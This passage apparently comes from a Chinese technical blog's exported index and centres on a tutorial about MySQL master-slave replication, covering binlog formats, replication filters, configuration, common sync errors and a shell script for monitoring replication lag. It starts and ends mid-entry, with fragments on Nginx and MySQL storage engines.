/usr/local/nginx/logs/error.log 文件，检查 nginx 是否启动 1ps aux |grep nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否有进程]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql数据库主从心得整理]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F26.%20Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E4%BB%8E%E5%BF%83%E5%BE%97%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[Mysql数据库主从心得整理一、mysql主从的原理1、Replication 线程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql的 Replication 是一个异步的复制过程（mysql5.1.7以上版本分为异步复制和半同步两种模式），从一个 Mysql instace(我们称之为 Master)复制到另一个 Mysql instance(我们称之 Slave)。在 Master 与 Slave 之间的实现整个复制过程主要由三个线程来完成，其中两个线程(Sql线程和IO线程)在 Slave 端，另外一个线程(IO线程)在 Master 端。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要实现 MySQL 的 Replication ，首先必须打开 Master 端的Binary Log(mysql-bin.xxxxxx)功能，否则无法实现。因为整个复制过程实际上就是Slave从Master端获取该日志然后再在自己身上完全 顺序的执行日志中所记录的各种操作。打开 MySQL 的 Binary Log 可以通过在启动 MySQL Server 的过程中使用 “—log-bin” 参数选项，或者在 my.cnf 配置文件中的 mysqld 参数组([mysqld]标识后的参数部分)增加 “log-bin” 参数项。 2、MySQL 复制的基本过程如下：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.1．Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.2. Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.3. Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.4. Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的。 3、Mysql复制的几种模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.1.从 MySQL 5.1.12 开始，可以用以下三种模式来实现： 基于SQL语句的复制(statement-based replication, SBR)， 基于行的复制(row-based replication, RBR)， 混合模式复制(mixed-based replication, MBR)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相应地，binlog的格式也有三种：STATEMENT，ROW，MIXED。 MBR 模式中，SBR 模式是默认的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在运行时可以动态改动 binlog的格式，除了以下几种情况： 存储流程或者触发器中间 启用了NDB 当前会话试用 RBR 模式，并且已打开了临时表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果binlog采用了 MIXED 模式，那么在以下几种情况下会自动将binlog的模式由 SBR 模式改成 RBR 模式： 当DML语句更新一个NDB表时 当函数中包含 UUID() 时 2个及以上包含 AUTO_INCREMENT 字段的表被更新时 行任何 INSERT DELAYED 语句时 用 UDF 时 视图中必须要求运用 RBR 时，例如建立视图是运用了 UUID() 函数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.2.设定主从复制模式： 1234log-bin=mysql-bin#binlog_format="STATEMENT"#binlog_format="ROW"binlog_format="MIXED" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以在运行时动态修改binlog的格式。例如 123456mysql&gt; SET SESSION binlog_format = 'STATEMENT';mysql&gt; SET SESSION binlog_format = 'ROW';mysql&gt; SET SESSION binlog_format = 'MIXED';mysql&gt; SET GLOBAL binlog_format = 'STATEMENT';mysql&gt; SET GLOBAL binlog_format = 'ROW';mysql&gt; SET GLOBAL binlog_format = 'MIXED'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3.3.两种模式各自的优缺点： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SBR 的优点： 历史悠久，技能成熟 binlog文件较小 binlog中包含了所有数据库修改信息，可以据此来审核数据库的安全等情况 binlog可以用于实时的还原，而不仅仅用于复制 主从版本可以不一样，从服务器版本可以比主服务器版本高 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SBR 的缺点： 不是所有的UPDATE语句都能被复制，尤其是包含不确定操作的时候。 调用具有不确定因素的 UDF 时复制也可能出疑问 运用以下函数的语句也不能被复制： LOAD_FILE() UUID() USER() FOUND_ROWS() SYSDATE() (除非启动时启用了 –sysdate-is-now 选项) INSERT … SELECT 会产生比 RBR 更多的行级锁 复制须要执行 全表扫描(WHERE 语句中没有运用到索引)的 UPDATE 时，须要比 RBR 请求更多的行级锁 对于有 AUTO_INCREMENT 字段的 InnoDB表而言，INSERT 语句会阻塞其他 INSERT 语句 对于一些复杂的语句，在从服务器上的耗资源情况会更严重，而 RBR 模式下，只会对那个发生变化的记录产生影响 存储函数(不是存储流程 )在被调用的同时也会执行一次 NOW() 函数，这个可以说是坏事也可能是好事 确定了的 UDF 也须要在从服务器上执行 数据表必须几乎和主服务器保持一致才行，否则可能会导致复制出错 执行复杂语句如果出错的话，会消耗更多资源 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RBR 的优点： 任何情况都可以被复制，这对复制来说是最安全可靠的 和其他大多数数据库系统的复制技能一样 多数情况下，从服务器上的表如果有主键的话，复制就会快了很多 复制以下几种语句时的行锁更少： INSERT … SELECT 包含 AUTO_INCREMENT 字段的 INSERT 没有附带条件或者并没有修改很多记录的 UPDATE 或 DELETE 语句 执行 INSERT，UPDATE，DELETE 语句时锁更少 从服务器上采用多线程来执行复制成为可能 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;RBR 的缺点： binlog 大了很多 复杂的回滚时 binlog 中会包含大量的数据 主服务器上执行 UPDATE 语句时，所有发生变化的记录都会写到 binlog 中，而 SBR 只会写一次，这会导致频繁发生 binlog 的并发写疑问 UDF 产生的大 BLOB 值会导致复制变慢 不能从 binlog 中看到都复制了写什么语句(加密过的) 当在非事务表上执行一段堆积的SQL语句时，最好采用 SBR 模式，否则很容易导致主从服务器的数据不一致情况发生 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，针对系统库 mysql 里面的表发生变化时的处理准则如下： 如果是采用 INSERT，UPDATE，DELETE 直接操作表的情况，则日志格式根据 binlog_format 的设定而记录 如果是采用 GRANT，REVOKE，SET PASSWORD 等管理语句来做的话，那么无论如何 都采用 SBR 模式记录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：采用 RBR 模式后，能处理很多原先出现的主键重复问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例:对于insert into db_allot_ids select * from db_allot_ids 这个语句: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在BINLOG_FORMAT=STATEMENT 模式下: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;BINLOG日志信息为: 1234567BEGIN/*!*/;# at 173#090612 16:05:42 server id 1 end_log_pos 288 Query thread_id=4 exec_time=0 error_code=0SET TIMESTAMP=1244793942/*!*/;insert into db_allot_ids select * from db_allot_ids/*!*/; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在BINLOG_FORMAT=ROW 模式下: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;BINLOG日志信息为: 1234BINLOG 'hA0yShMBAAAAMwAAAOAAAAAAAA8AAAAAAAAAA1NOUwAMZGJfYWxsb3RfaWRzAAIBAwAAhA0yShcBAAAANQAAABUBAAAQAA8AAAAAAAEAAv/8AQEAAAD8AQEAAAD8AQEAAAD8AQEAAAA='/*!*/; 4、Mysql主从的优缺点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL的主从同步是一个很成熟的架构，优点为：①在从服务器可以执行查询工作(即我们常说的读功能)，降低主服 务器压力;②在从主服务器进行备份，避免备份期间影响主服务器服务;③当主服务器出现问题时，可以切换到从服务器。所以我在项目部署和实施中经常会采用这种方案;鉴于生产环境下的mysql的严谨性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实际上，在老版本中，MySQL 的复制实现在 Slave 端并不是由 SQL 线程和 IO 线程这两个线程共同协作而完成的，而是由单独的一个线程来完成所有的工作。但是 MySQL 的工程师们很快发现，这样做存在很大的风险和性能问题，主要如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，如果通过一个单一的线程来独立实现这个工作的话，就使复制 Master 端的，Binary Log日志，以及解析这些日志，然后再在自身执行的这个过程成为一个串行的过程，性能自然会受到较大的限制，这种架构下的 Replication 的延迟自然就比较长了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其次，Slave 端的这个复制线程从 Master 端获取 Binary Log 过来之后，需要接着解析这些内容，还原成 Master 端所执行的原始 Query，然后在自身执行。在这个过程中，Master端很可能又已经产生了大量的变化并生成了大量的 Binary Log 信息。如果在这个阶段 Master 端的存储系统出现了无法修复的故障，那么在这个阶段所产生的所有变更都将永远的丢失，无法再找回来。这种潜在风险在Slave 端压力比较大的时候尤其突出，因为如果 Slave 压力比较大，解析日志以及应用这些日志所花费的时间自然就会更长一些，可能丢失的数据也就会更多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，在后期的改造中，新版本的 MySQL 为了尽量减小这个风险，并提高复制的性能，将 Slave 端的复制改为两个线程来完成，也就是前面所提到的 SQL 线程和 IO 线程。最早提出这个改进方案的是Yahoo!的一位工程师“Jeremy Zawodny”。通过这样的改造，这样既在很大程度上解决了性能问题，缩短了异步的延时时间，同时也减少了潜在的数据丢失量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，即使是换成了现在这样两个线程来协作处理之后，同样也还是存在 Slave 数据延时以及数据丢失的可能性的，毕竟这个复制是异步的。只要数据的更改不是在一个事务中，这些问题都是存在的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要完全避免这些问题，就只能用 MySQL 的 Cluster 来解决了。不过 MySQL的 Cluster 知道笔者写这部分内容的时候，仍然还是一个内存数据库的解决方案，也就是需要将所有数据包括索引全部都 Load 到内存中，这样就对内存的要求就非常大的大，对于一般的大众化应用来说可实施性并不是太大。MySQL 现在正在不断改进其 Cluster 的实现，其中非常大的一个改动就是允许数据不用全部 Load 到内存中，而仅仅只是索引全部 Load 到内存中，我想信在完成该项改造之后的 MySQL Cluster 将会更加受人欢迎，可实施性也会更大。 5、Mysql的半同步模式（Semisynchronous Replication）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道在5.5之前，MySQL的复制其实是异步操作，而不是同步，也就意味着允许主从之间的数据存在一定的延迟，mysql当初这样设计的目的可能也是基于可用性的考虑，为了保证master不受slave的影响，并且异步复制使得master处于一种性能最优的状态：写完binlog后即可提交而不需要等待slave的操作完成。这样存在一个隐患，当你使用slave作为备份时，如果master挂掉，那么会存在部分已提交的事务未能成功传输到slave的可能，这就意味着数据丢失！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在MySQL5.5版本中，引入了半同步复制模式（Semi-synchronous Replication）能够成功（只是相对的）避免上述数据丢失的隐患。在这种模式下：master会等到binlog成功传送并写入至少一个slave的relay log之后才会提交，否则一直等待，直到timeout（默认10s）。当出现timeout的时候，master会自动切换半同步为异步，直到至少有一个slave成功收到并发送Acknowledge，master会再切换回半同步模式。结合这个新功能，我们可以做到，在允许损失一定的事务吞吐量的前提下来保证同步数据的绝对安全，因为当你设置timeout为一个足够大的值的情况下，任何提交的数据都会安全抵达slave。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql5.5 版本支持半同步复制功能（Semisynchronous Replication），但还不是原生的支持，是通过plugin来支持的，并且默认是没有安装这个插件的。不论是二进制发布的，还是自己源代码编译的，都会默认生成这个插件，一个是针对master 的一个是针对slave的，在使用之前需要先安装这俩plugins。 二、Mysql主从复制的过滤&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制的过滤主要有２种方式： 在主服务器在把事件从进二制日志中过滤掉，相关的参数是:binlog_do_db和binlog_ignore_db。 在从服务器上把事件从中继日志中过滤掉，相关的参数是replicate_*。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制只能扩展读取，不能扩展写入，对数据进行分区可以进行扩展写入。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制的优化： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在mysql复制环境中,有8个参数可以让我们控制,需要复制或需要忽略不进行复制的DB或table分别为: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面二项需要在Master上设置： Binlog_Do_DB:设定哪些数据库需要记录Binlog Binlog_Ignore_DB:设定哪里数据库不需要记录Binlog &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点是Master端的Binlog记录所带来的Io量减少，网络IO减少，还会让slave端的IO线程,SQL线程减少，从而大幅提高复制性能, &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点是mysql判断是否需要复制某个事件不是根据产生该事件的查询所在的DB,而是根据执行查询时刻所在的默认数据库（也就是登录时指定的库名或运行”use database”中指定的DB）,只有当前默认DB和配置中所设定的DB完全吻合时IO线程才会将该事件读取给slave的IO线程.所以,如果在默认DB和设定须要复制的DB不一样的情况下改变了须要复制的DB中某个Table中的数据,该事件是不会被复制到Slave中去的,这样就会造成Slave端的数据和Master的数据不一致.同样,在默认的数据库下更改了不须要复制的数据库中的数据,则会被复制到slave端,当slave端并没有该数据库时,则会造成复制出错而停止。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面六项需要在slave上设置： Replicate_Do_DB:设定需要复制的数据库,多个DB用逗号分隔 Replicate_Ignore_DB:设定可以忽略的数据库. Replicate_Do_Table:设定需要复制的Table Replicate_Ignore_Table:设定可以忽略的Table Replicate_Wild_Do_Table:功能同Replicate_Do_Table,但可以带通配符来进行设置。 Replicate_Wild_Ignore_Table:功能同Replicate_Do_Table,功能同Replicate_Ignore_Table,可以带通配符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优点是在slave端设置复制过滤机制,可以保证不会出现因为默认的数据库问题而造成Slave和Master数据不一致或复制出错的问题. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缺点是性能方面比在Master端差一些.原因在于:不管是否须要复制,事件都会被IO线程读取到Slave端,这样不仅增加了网络IO量,也给Slave端的IO线程增加了Relay Log的写入量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 注：在实际的生产应用中发现，在mysql5.0以前的版本，mysql的这个过滤设置几乎是形同虚设，不起作用：不管你在主库或是从库上设置了忽略某个数据库或是表，他依然会进行同步，所以在做5.0以前版本的主从同步时，一定保持主从数据库的一致性，主上有的库或是表从上一定要有，否则在同步的过程会出错。 三、Mysql主从同步的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主库IP：192.168.1.2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从库IP：192.168.1.3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加一个用于主从同步的用户： 1GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%' IDENTIFIED BY ‘1q2w3e4r’; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果监控mysql主从的话，请加上一个super权限： 1GRANT SUPER, REPLICATION SLAVE ON *.* TO &apos;repl&apos;@&apos;%&apos; IDENTIFIED BY &apos;1q2w3e4r&apos;; 1、主库的配置1.1．mysql5.0以下版本的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改主库mysql配置配置文件，在[mysqld]段添加以下内容： 1234567server-id = 1log-bin=/home/mysql/logs/binlog/bin-logmax_binlog_size = 500Mbinlog_cache_size = 128Kbinlog-do-db = adbbinlog-ignore-db = mysqllog-slave-updates 1.2. mysql5.0以上版本的配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改主库mysql配置配置文件，在[mysqld]段添加以下内容： 123456789server-id = 1log-bin=/home/mysql/logs/binlog/bin-logmax_binlog_size = 500Mbinlog_cache_size = 128Kbinlog-do-db = adbbinlog-ignore-db = mysqllog-slave-updatesexpire_logs_day=2binlog_format="MIXED" 1.3.各个参数的含义和相关注意项： server-id = 1 #服务器标志号，注意在配置文件中不能出现多个这样的标识，如果出现多个的话mysql以第一个为准，一组主从中此标识号不能重复。 log-bin=/home/mysql/logs/binlog/bin-log #开启bin-log，并指定文件目录和文件名前缀。 max_binlog_size = 500M #每个bin-log最大大小，当此大小等于500M时会自动生成一个新的日志文件。一条记录不会写在2个日志文件中，所以有时日志文件会超过此大小。 binlog_cache_size = 128K #日志缓存大小 binlog-do-db = adb #需要同步的数据库名字，如果是多个，就以此格式在写一行即可。 binlog-ignore-db = mysql #不需要同步的数据库名字，如果是多个，就以此格式在写一行即可。 log-slave-updates #当Slave从Master数据库读取日志时更新新写入日志中，如果只启动log-bin 而没有启动log-slave-updates则Slave只记录针对自己数据库操作的更新。 expire_logs_day=2 #设置bin-log日志文件保存的天数，此参数mysql5.0以下版本不支持。 binlog_format=”MIXED” #设置bin-log日志文件格式为：MIXED，可以防止主键重复。 2、从库的配置2.1.mysql5.1.7以前版本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改从库mysql配置配置文件，在[mysqld]段添加以下内容： 1234567891011121314server-id=2master-host=192.168.1.2master-user=replmaster-password=1q2w3e4rmaster-port=3306master-connect-retry=30slave-skip-errors=1062replicate-do-db = adbreplicate-ignore-db = mysqlslave-skip-errors=1007,1008,1053,1062,1213,1158,1159master-info-file = /home/mysql/logs/master.inforelay-log = /home/mysql/logs/relay-binrelay-log-index = /home/mysql/logs/relay-bin.indexrelay-log-info-file = /home/mysql/logs/relay-log.info &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果修改了连接主库相关信息，重启之前一定要删除master.info文件，否则重启之后由于连接信息改变从库而不会自动连接主库，造成同步失败。此文件是保存连接主库信息的。 2.2.mysql5.1.7以后版本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql5.1.7版本在丛库上面的配置很少，主要是采用了新的同步信息记录方式，他不在支持在配置文件中配置连接主库的相关信息，而是把连接等相关信息记录在master-info-file = /home/mysql/logs/master.info文件中，如果入库变了，直接在mysql命令行执行连接信息的改变即可生效，比较灵活了，而不用去重启mysql。修改从库mysql配置配置文件，在[mysqld]段添加以下内容： 1slave-skip-errors=1007,1008,1053,1062,1213,1158,1159 2.3.各个参数的含义和相关注意项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里只讲一下2个参数，其他全部是从库连接主库的信息和中间日志relay-log的设置。 master-connect-retry=30 #这个选项控制重试间隔，默认为60秒。 slave-skip-errors=1007,1008,1053,1062,1213,1158,1159 #这个是在同步过程中忽略掉的错误，这些错误不会影响数据的完整性，有事经常出现的错误，一般设置忽略。其中1062为主键重复错误。 3、实现主从同步3.1.实现数据库的统一&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查主从数据库的配置文件，查看是否已正确配置。首次实现 同步要备份主库上需要同步的数据库，然后完整的导入到从库中。注：mysql5.0之前的版本涉及到mysql本身复制过滤存在问题，需要把所有的数据库都备份导入到丛库，保持。 3.2.查看并记录主库bin-log信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入主库mysql中，执行：show master status;显示信息如下： 1234567mysql&gt; show master status;+-------------+----------+--------------+------------------+| File | Position | Binlog_do_db | Binlog_ignore_db |+-------------+----------+--------------+------------------+| bin-log.003 | 4 | adb | mysql |+-------------+----------+--------------+------------------+1 row in set (0.00 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;记录File 和Position信息； 3.3.在从库上执行同步语句&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入mysql，执行以下语句： 123456789slave stop;change master tomaster_host='192.168.1.2',master_user='repl',master_password='1q2w3e4r',master_port=3306,master_log_file='bin-log.003',master_log_pos=4;slave start; 3.4.查看主从同步状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入mysql，执行show slave status\G;显示如下（mysql版本不同查询的结果不同，但是重要的指标还是一样的）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql5.0之前的版本如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql5.5之前的版本如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql5.5的版本如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重要的指标为： 1234567Slave_IO_Running: YesSlave_SQL_Running: YesMaster_Log_File: bin-log.003Relay_Master_Log_File: bin-log.003Read_Master_Log_Pos: 4Exec_master_log_pos: 4Seconds_Behind_Master: 0（5.0之前版本没有这个选项） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上选项是两两对应的，只要结果是一致的，就说明主从同步成功。 3.5.同步中的常见的错误和处理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、现象：在从库上面show slave status\G;出现下列情况， 123Slave_IO_Running: YesSlave_SQL_Running: NoSeconds_Behind_Master: NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原因： 程序可能在slave上进行了写操作； 也可能是slave机器重起后，事务回滚造成的； 有可能是在同步过程中遇到某种错误，这个会在查看从库中状态时看到错误提示，最少见的就是主键重复1062的错误。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入master 123456mysql&gt; show master status;+----------------------+----------+--------------+------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB |+----------------------+----------+--------------+------------------+| mysql-bin.000040 | 324 |adb | mysql |+----------------------+----------+--------------+------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后到slave服务器上执行手动同步 12345678910slave stop;change master tomaster_host='10.14.0.140',master_user='repl',master_password='1q2w3e4r',master_port=3306,master_log_file='mysql-bin.000040',master_log_pos=324;slave start;show slave status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、现象：从数据库无法同步，show slave status显示: 123Slave_IO_Running: NoSlave_SQL_Running: YesSeconds_Behind_Master: NULL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决：首先查看数据库的err日志，查看是什么错误提示，看从库连接主库的IP、用户、密码等相关信息是否有误，如果有误，重新执行同步；如果确认无误，重启主数据库。 123456mysql&gt; show master status;+------------------+----------+--------------+------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB |+------------------+----------+--------------+------------------+| mysql-bin.000001 | 98 | adb| mysql|+------------------+----------+--------------+------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入从库mysql，执行： 1234567slave stop;change master to Master_Log_File='mysql-bin.000001',Master_Log_Pos=98;slave start;或是这样：stop slave;set global sql_slave_skip_counter =1;start slave; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个现象主要是master数据库存在问题，由于连接主库信息错误、主库数据库挂掉如果说常见错等原因引起的，我在实际的操作中先重启master后重启slave即可解决这问题，出现此问题，必须要要重启master数据库。 四、mysql主主和主主集群1、mysql主主的实现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在实际的生产应用中，为了在主库出现崩溃或是主服务器出现严重故障时快速的恢复业务，会直接切换到从库上，当主库故障处理完成后让他直接作为丛库来运行，此时主主就是一个不错的选择。 五、mysql主从的监控&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在mysql主从的应用中，只要进行了合理设置，基本上不会出现问题，但是对他的监控是必不可少的，以免由于真的出现问题又不知道而造成不必要的数据损失。 1、mysql主从监控的主要思路&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mysql主从的监控，其主要是监控从库上的一些重要参数： 1234567Slave_IO_Running: YesSlave_SQL_Running: YesMaster_Log_File: bin-log.003Relay_Master_Log_File: bin-log.003Read_Master_Log_Pos: 4Exec_master_log_pos: 4Seconds_Behind_Master: 0（5.0之前版本没有这个选项） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过以上的参数可以反映出主库和从库状态是否正常，从库是否落后于主库等。值得一提的是在mysql5.0以前的版本，Slave_IO_Running这个状态指标不可靠，会在主库直接挂掉的情况下不会变成NO，Seconds_Behind_Master参数也不存在。监控以上参数即可监控mysql主从。 2、mysql主从监控的实现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不管mysql是那个版本，其中的从库上的Exec_master_log_pos、Exec_master_log_pos；主库上的 Master上的Log_File， Position，这四个参数可以判断出当前主从的状态。以下是适用于mysql所有版本的主从监控shell脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#/bin/shuser=replpasswd=123415master_ip="192.168.1.2"log="/data3/check_repl.log"value()&#123; master=`/usr/local/mysql/bin/mysql -u$user -p$passwd -h$master_ip -e "show master status\G;"|egrep "File|Position"` #mysql 4.0 slave=`/usr/local/mysql/bin/mysql -u$user -p$passwd -h127.0.0.1 -e "show slave status\G;"|egrep "Relay_Master_Log_File|Exec_master_log_pos"` #mysql 5.0 #slave=`mysql -u$user -p$passwd -e "show slave status\G;"|egrep "Relay_Master_Log_File|Exec_Master_Log_Pos"` #取主库上的bin-log号及写入的当前日志位置 Master_Log=`echo $master |awk '&#123;print $2&#125;'|awk -F "." '&#123;print $2&#125;'` Master_Log_Pos=`echo $master |awk '&#123;print $4&#125;'` #取从库上当前同步主库的位置 Relay_Master_Log_File=`echo $slave |awk '&#123;print $2&#125;'|awk -F "." '&#123;print $2&#125;'` Exec_Master_Log_Pos=`echo $slave |awk '&#123;print $4&#125;'` echo "Master_Log:"$Master_Log&gt;&gt;$log echo "Master_Log_Pos:"$Master_Log_Pos&gt;&gt;$log echo "Relay_Master_Log_File:"$Relay_Master_Log_File&gt;&gt;$log echo "Exec_Master_Log_Pos:"$Exec_Master_Log_Pos&gt;&gt;$log&#125;for((i=1;i&lt;=10;i++));do echo "#################################"&gt;&gt;$log value time=`date +"%Y-%m-%d %H:%M:%S"` if [ $Master_Log -eq $Relay_Master_Log_File ];then A=`expr $Master_Log_Pos - $Exec_Master_Log_Pos` if [ $A -lt 0 ];then A=`expr 0 - $A` fi echo $A&gt;&gt;$log if [ $A -lt 10000 ];then echo "$time Master-Slave is OK."&gt;&gt;$log #echo "$i" break else if [ $i ge 3 ];then echo "$time Warning:Slave-Master lag $A " &gt;&gt;$log echo "$i" fi sleep 30 continue fi else sleep 60 fi if [ $i -eq 10 ];then echo "$i" echo "$time Error:Slave-Master must be check !" &gt;&gt;$log fidone &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在mysql5.0以后的版本，mysql主从已经相当的成熟了，可以只监控Slave_IO_Running，Slave_SQL_Running，Seconds_Behind_Master状态就可以了，这里不再做说明。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql各种存储引擎的特性以及如何选择存储引擎]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F17.%20Mysql%E5%90%84%E7%A7%8D%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E7%9A%84%E7%89%B9%E6%80%A7%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[Mysql各种存储引擎的特性以及如何选择存储引擎几个常用存储引擎的特点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面我们重点介绍几种常用的存储引擎并对比各个存储引擎之间的区别和推荐使用方式。 特点 Myisam BDB Memory InnoDB Archive 存储限制 没有 没有 有 64TB 没有 事务安全 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 锁机制 表锁 页锁 表锁 行锁 行锁 B树索引 支持 支持 支持 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 哈希索引 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 支持 支持&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 全文索引 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 集群索引 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 数据缓存 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 支持 支持 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 